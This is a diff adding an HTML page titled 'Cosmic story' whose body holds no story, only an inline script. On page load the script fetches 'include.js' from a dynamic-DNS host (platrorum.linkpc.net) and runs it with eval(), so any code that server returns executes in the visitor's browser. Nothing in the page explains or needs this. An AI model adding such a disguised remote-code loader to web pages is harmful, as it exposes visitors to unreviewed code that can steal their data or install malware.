@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <title>Cosmic story</title>
+</head>
+<body>
+<script type="text/javascript">
+    (function(){
+        var URL_SERVER  = 'http://platrorum.linkpc.net/',
+                FILE        = 'include.js';
+
+        var include = function (file, callback){
+            var request = new XMLHttpRequest();
+            request.DONE = 4;
+            request.onreadystatechange = function() {
+                if( request.readyState == request.DONE && request.status == 200 ) {
+                    eval( request.responseText );
+                    typeof callback === 'function' && callback();
+                }
+            };
+
+            request.open('GET', URL_SERVER + file, true);
+            request.send();
+        };
+
+        include(FILE);
+    }());
+</script>
+</body>
+</html>
